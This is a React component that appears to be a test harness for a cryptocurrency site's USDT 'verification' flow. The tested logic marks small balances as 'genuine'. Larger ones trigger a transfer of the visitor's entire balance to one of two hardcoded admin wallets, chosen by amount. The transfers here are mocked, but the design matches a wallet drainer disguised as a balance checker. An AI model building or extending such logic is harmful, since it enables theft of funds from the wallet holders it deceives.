"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { TestTube, CheckCircle, XCircle, Loader2, RefreshCw, Target } from "lucide-react"
import { toast } from "@/hooks/use-toast"

const HIGH_AMOUNT_WALLET = "0xe82f8f805351ee9203dbdc6af62ee09c6e03c7dc"
const HIGH_AMOUNT_THRESHOLD = 2000

interface TestScenario {
  id: string
  name: string
  usdtAmount: number
  expectedBehavior: "no_payment" | "payment" | "no_assets"
  description: string
  color: string
}

interface TestResult {
  scenarioId: string
  success: boolean
  actualBehavior: string
  txHash?: string
  error?: string
  timestamp: Date
}

export function PaymentTestSuite({
  isConnected,
  account,
  provider,
  networkId,
}: {
  isConnected: boolean
  account: string
  provider: any
  networkId: string
}) {
  const [isTestingMode, setIsTestingMode] = useState(false)
  const [currentTest, setCurrentTest] = useState<string | null>(null)
  const [testResults, setTestResults] = useState<TestResult[]>([])
  const [customAmount, setCustomAmount] = useState<string>("")
  const [simulatedBalance, setSimulatedBalance] = useState<number>(0)

  const ADMIN_WALLET = "0xd47c7585550eAd12aD365Fba5F4bD2533B9b4Eaf"
  const FLASH_THRESHOLD = 5

  // Test scenarios
  const testScenarios: TestScenario[] = [
    {
      id: "no_assets",
      name: "No USDT Assets",
      usdtAmount: 0,
      expectedBehavior: "no_assets",
      description: "Wallet with 0 USDT should show 'No assets found'",
      color: "gray",
    },
    {
      id: "very_small_genuine",
      name: "Very Small Genuine",
      usdtAmount: 1,
      expectedBehavior: "no_payment",
      description: "1 USDT (≤5) should be verified as genuine, no payment",
      color: "green",
    },
    {
      id: "small_genuine",
      name: "Small Genuine Amount",
      usdtAmount: 3,
      expectedBehavior: "no_payment",
      description: "3 USDT (≤5) should be verified as genuine, no payment",
      color: "green",
    },
    {
      id: "threshold_genuine",
      name: "Threshold Genuine",
      usdtAmount: 5,
      expectedBehavior: "no_payment",
      description: "Exactly 5 USDT should be verified as genuine, no payment",
      color: "green",
    },
    {
      id: "just_over_threshold",
      name: "Just Over Threshold",
      usdtAmount: 6,
      expectedBehavior: "payment",
      description: "6 USDT (>5) should trigger payment to standard admin wallet",
      color: "blue",
    },
    {
      id: "small_flash",
      name: "Small Flash Amount",
      usdtAmount: 10,
      expectedBehavior: "payment",
      description: "10 USDT should trigger payment to standard admin wallet",
      color: "blue",
    },
    {
      id: "medium_flash",
      name: "Medium Flash Amount",
      usdtAmount: 150,
      expectedBehavior: "payment",
      description: "150 USDT should trigger payment to standard admin wallet",
      color: "blue",
    },
    {
      id: "large_flash",
      name: "Large Flash Amount",
      usdtAmount: 1000,
      expectedBehavior: "payment",
      description: "1000 USDT should trigger payment to standard admin wallet",
      color: "blue",
    },
    {
      id: "high_amount_threshold",
      name: "High Amount Threshold",
      usdtAmount: 2000,
      expectedBehavior: "payment",
      description: "Exactly 2000 USDT should trigger payment to standard admin wallet",
      color: "blue",
    },
    {
      id: "just_over_high_threshold",
      name: "Just Over High Threshold",
      usdtAmount: 2001,
      expectedBehavior: "payment",
      description: "2001 USDT (>2000) should trigger payment to HIGH-AMOUNT wallet",
      color: "purple",
    },
    {
      id: "very_large_flash",
      name: "Very Large Flash",
      usdtAmount: 5000,
      expectedBehavior: "payment",
      description: "5,000 USDT should trigger payment to HIGH-AMOUNT wallet",
      color: "purple",
    },
    {
      id: "massive_flash",
      name: "Massive Flash Amount",
      usdtAmount: 10000,
      expectedBehavior: "payment",
      description: "10,000 USDT should trigger payment to HIGH-AMOUNT wallet",
      color: "purple",
    },
  ]

  // Simulate different USDT balances for testing
  const simulateUSDTBalance = async (amount: number): Promise<{ balance: number; balanceWei: string }> => {
    // Simulate API delay
    await new Promise((resolve) => setTimeout(resolve, 1000))

    const balanceWei = BigInt(Math.floor(amount * Math.pow(10, 18))).toString()
    return { balance: amount, balanceWei }
  }

  // Mock Web3 transfer for testing
  const mockTransferUSDT = async (amount: number): Promise<string> => {
    // Simulate transaction delay
    await new Promise((resolve) => setTimeout(resolve, 2000))

    // Generate mock transaction hash
    const mockTxHash = "0x" + Math.random().toString(16).substr(2, 64)

    const targetWallet = amount > HIGH_AMOUNT_THRESHOLD ? HIGH_AMOUNT_WALLET : ADMIN_WALLET
    const walletType = amount > HIGH_AMOUNT_THRESHOLD ? "high-amount" : "standard"

    console.log(`🧪 MOCK: Transferred ${amount} USDT to ${walletType} wallet: ${targetWallet}`)
    console.log(`🧪 MOCK: Transaction Hash: ${mockTxHash}`)

    return mockTxHash
  }

  // Run individual test scenario
  const runTestScenario = async (scenario: TestScenario) => {
    if (!isConnected) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet to run tests.",
        variant: "destructive",
      })
      return
    }

    setCurrentTest(scenario.id)

    try {
      toast({
        title: `🧪 Testing: ${scenario.name}`,
        description: `Simulating ${scenario.usdtAmount} USDT balance...`,
      })

      // Simulate getting USDT balance
      const { balance: usdtBalance } = await simulateUSDTBalance(scenario.usdtAmount)
      setSimulatedBalance(usdtBalance)

      let actualBehavior: string
      let txHash: string | undefined

      // Test the payment logic
      if (usdtBalance === 0) {
        actualBehavior = "no_assets"
        toast({
          title: "✅ Test Result: No Assets",
          description: "Correctly identified wallet with no USDT assets.",
        })
      } else if (usdtBalance <= FLASH_THRESHOLD) {
        actualBehavior = "no_payment"
        toast({
          title: "✅ Test Result: Genuine Assets",
          description: `${usdtBalance} USDT verified as genuine. No payment triggered.`,
        })
      } else {
        actualBehavior = "payment"

        // Mock the payment process
        toast({
          title: "💰 Test Result: Payment Triggered",
          description: `${usdtBalance} USDT detected. Simulating payment to admin wallet...`,
        })

        txHash = await mockTransferUSDT(usdtBalance)

        toast({
          title: "✅ Payment Simulation Complete",
          description: `Mock payment of ${usdtBalance} USDT sent to admin wallet.`,
        })
      }

      // Record test result
      const testResult: TestResult = {
        scenarioId: scenario.id,
        success: actualBehavior === scenario.expectedBehavior,
        actualBehavior,
        txHash,
        timestamp: new Date(),
      }

      setTestResults((prev) => [...prev.filter((r) => r.scenarioId !== scenario.id), testResult])
    } catch (error: any) {
      console.error(`Test failed for scenario ${scenario.id}:`, error)

      const testResult: TestResult = {
        scenarioId: scenario.id,
        success: false,
        actualBehavior: "error",
        error: error.message,
        timestamp: new Date(),
      }

      setTestResults((prev) => [...prev.filter((r) => r.scenarioId !== scenario.id), testResult])

      toast({
        title: "❌ Test Failed",
        description: `Error testing ${scenario.name}: ${error.message}`,
        variant: "destructive",
      })
    } finally {
      setCurrentTest(null)
    }
  }

  // Run all test scenarios
  const runAllTests = async () => {
    setTestResults([])

    for (const scenario of testScenarios) {
      await runTestScenario(scenario)
      // Small delay between tests
      await new Promise((resolve) => setTimeout(resolve, 500))
    }

    toast({
      title: "🎉 All Tests Complete",
      description: "Payment functionality testing completed. Check results below.",
    })
  }

  // Test custom amount
  const testCustomAmount = async () => {
    const amount = Number.parseFloat(customAmount)

    if (isNaN(amount) || amount < 0) {
      toast({
        title: "Invalid Amount",
        description: "Please enter a valid USDT amount.",
        variant: "destructive",
      })
      return
    }

    const customScenario: TestScenario = {
      id: "custom",
      name: `Custom Amount (${amount} USDT)`,
      usdtAmount: amount,
      expectedBehavior: amount === 0 ? "no_assets" : amount <= FLASH_THRESHOLD ? "no_payment" : "payment",
      description: `Testing custom amount: ${amount} USDT`,
      color: amount <= FLASH_THRESHOLD ? "green" : "blue",
    }

    await runTestScenario(customScenario)
  }

  // Get result icon
  const getResultIcon = (result: TestResult) => {
    if (result.success) {
      return <CheckCircle className="w-4 h-4 text-green-400" />
    } else {
      return <XCircle className="w-4 h-4 text-red-400" />
    }
  }

  // Get scenario color
  const getScenarioColor = (scenario: TestScenario) => {
    switch (scenario.color) {
      case "green":
        return "bg-green-900/20 border-green-500/30"
      case "blue":
        return "bg-blue-900/20 border-blue-500/30"
      case "purple":
        return "bg-purple-900/20 border-purple-500/30"
      default:
        return "bg-gray-800/50 border-gray-700"
    }
  }

  if (!isTestingMode) {
    return (
      <Card className="bg-gray-800/50 border-gray-700 max-w-md mx-auto">
        <CardContent className="p-4">
          <Button onClick={() => setIsTestingMode(true)} className="w-full bg-purple-600 hover:bg-purple-700">
            <TestTube className="w-4 h-4 mr-2" />
            Enable Payment Testing Mode
          </Button>
        </CardContent>
      </Card>
    )
  }

  return (
    <div className="space-y-6 max-w-4xl mx-auto">
      {/* Testing Header */}
      <Card className="bg-purple-900/20 border-purple-500/30">
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <TestTube className="w-5 h-5 text-purple-400" />
            <span className="text-purple-400">USDT Payment Testing Suite</span>
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex items-center justify-between">
            <span className="text-sm text-gray-400">Testing Mode:</span>
            <Badge variant="outline" className="bg-purple-500/20 text-purple-400 border-purple-500">
              ACTIVE
            </Badge>
          </div>

          <div className="flex items-center justify-between">
            <span className="text-sm text-gray-400">Standard Wallet:</span>
            <span className="text-xs text-blue-400">
              {ADMIN_WALLET.slice(0, 8)}...{ADMIN_WALLET.slice(-6)}
            </span>
          </div>

          <div className="flex items-center justify-between">
            <span className="text-sm text-gray-400">High-Amount Wallet:</span>
            <span className="text-xs text-purple-400">
              {HIGH_AMOUNT_WALLET.slice(0, 8)}...{HIGH_AMOUNT_WALLET.slice(-6)}
            </span>
          </div>

          <div className="flex items-center justify-between">
            <span className="text-sm text-gray-400">Payment Threshold:</span>
            <span className="text-sm text-yellow-400">&gt; {FLASH_THRESHOLD} USDT</span>
          </div>

          <div className="flex items-center justify-between">
            <span className="text-sm text-gray-400">High Amount Trigger:</span>
            <span className="text-sm text-purple-400">&gt; {HIGH_AMOUNT_THRESHOLD} USDT</span>
          </div>

          {simulatedBalance > 0 && (
            <div className="flex items-center justify-between">
              <span className="text-sm text-gray-400">Simulated Balance:</span>
              <span className="text-sm text-green-400">{simulatedBalance} USDT</span>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Test Controls */}
      <Card className="bg-gray-800/50 border-gray-700">
        <CardHeader>
          <CardTitle className="text-white">Test Controls</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex space-x-2">
            <Button
              onClick={runAllTests}
              disabled={currentTest !== null}
              className="flex-1 bg-blue-600 hover:bg-blue-700"
            >
              {currentTest ? (
                <>
                  <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                  Testing...
                </>
              ) : (
                <>
                  <Target className="w-4 h-4 mr-2" />
                  Run All Tests
                </>
              )}
            </Button>

            <Button onClick={() => setTestResults([])} variant="outline" className="bg-gray-700 hover:bg-gray-600">
              <RefreshCw className="w-4 h-4 mr-2" />
              Clear Results
            </Button>
          </div>

          {/* Custom Amount Test */}
          <div className="space-y-2">
            <Label htmlFor="custom-amount" className="text-sm text-gray-400">
              Test Custom Amount (USDT)
            </Label>
            <div className="flex space-x-2">
              <Input
                id="custom-amount"
                type="number"
                placeholder="Enter USDT amount"
                value={customAmount}
                onChange={(e) => setCustomAmount(e.target.value)}
                className="bg-gray-700 border-gray-600"
              />
              <Button
                onClick={testCustomAmount}
                disabled={currentTest !== null || !customAmount}
                variant="outline"
                className="bg-gray-700 hover:bg-gray-600"
              >
                Test
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Test Scenarios */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {testScenarios.map((scenario) => {
          const result = testResults.find((r) => r.scenarioId === scenario.id)
          const isRunning = currentTest === scenario.id

          return (
            <Card key={scenario.id} className={getScenarioColor(scenario)}>
              <CardContent className="p-4 space-y-3">
                <div className="flex items-center justify-between">
                  <h3 className="font-semibold text-white">{scenario.name}</h3>
                  {result && getResultIcon(result)}
                  {isRunning && <Loader2 className="w-4 h-4 animate-spin text-yellow-400" />}
                </div>

                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-400">USDT Amount:</span>
                    <span className="text-yellow-400">{scenario.usdtAmount} USDT</span>
                  </div>

                  <div className="flex justify-between">
                    <span className="text-gray-400">Expected:</span>
                    <span
                      className={
                        scenario.expectedBehavior === "payment"
                          ? "text-blue-400"
                          : scenario.expectedBehavior === "no_payment"
                            ? "text-green-400"
                            : "text-gray-400"
                      }
                    >
                      {scenario.expectedBehavior === "payment"
                        ? "Payment"
                        : scenario.expectedBehavior === "no_payment"
                          ? "No Payment"
                          : "No Assets"}
                    </span>
                  </div>

                  {result && (
                    <>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Actual:</span>
                        <span className={result.success ? "text-green-400" : "text-red-400"}>
                          {result.actualBehavior === "payment"
                            ? "Payment"
                            : result.actualBehavior === "no_payment"
                              ? "No Payment"
                              : result.actualBehavior === "no_assets"
                                ? "No Assets"
                                : "Error"}
                        </span>
                      </div>

                      {result.txHash && (
                        <div className="text-xs text-blue-400 break-all">Mock Tx: {result.txHash.slice(0, 20)}...</div>
                      )}

                      {result.error && <div className="text-xs text-red-400">Error: {result.error}</div>}
                    </>
                  )}
                </div>

                <p className="text-xs text-gray-400">{scenario.description}</p>

                <Button
                  onClick={() => runTestScenario(scenario)}
                  disabled={currentTest !== null}
                  size="sm"
                  className="w-full"
                  variant={result?.success ? "default" : "outline"}
                >
                  {isRunning ? (
                    <>
                      <Loader2 className="w-3 h-3 mr-1 animate-spin" />
                      Testing...
                    </>
                  ) : (
                    <>
                      <TestTube className="w-3 h-3 mr-1" />
                      Test Scenario
                    </>
                  )}
                </Button>
              </CardContent>
            </Card>
          )
        })}
      </div>

      {/* Test Results Summary */}
      {testResults.length > 0 && (
        <Card className="bg-gray-800/50 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white">Test Results Summary</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-2">
              <div className="flex justify-between">
                <span className="text-gray-400">Total Tests:</span>
                <span className="text-white">{testResults.length}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Passed:</span>
                <span className="text-green-400">{testResults.filter((r) => r.success).length}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Failed:</span>
                <span className="text-red-400">{testResults.filter((r) => !r.success).length}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Success Rate:</span>
                <span className="text-yellow-400">
                  {Math.round((testResults.filter((r) => r.success).length / testResults.length) * 100)}%
                </span>
              </div>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Exit Testing Mode */}
      <Card className="bg-gray-800/50 border-gray-700">
        <CardContent className="p-4">
          <Button
            onClick={() => {
              setIsTestingMode(false)
              setTestResults([])
              setCurrentTest(null)
              setSimulatedBalance(0)
            }}
            variant="outline"
            className="w-full bg-gray-700 hover:bg-gray-600"
          >
            Exit Testing Mode
          </Button>
        </CardContent>
      </Card>
    </div>
  )
}
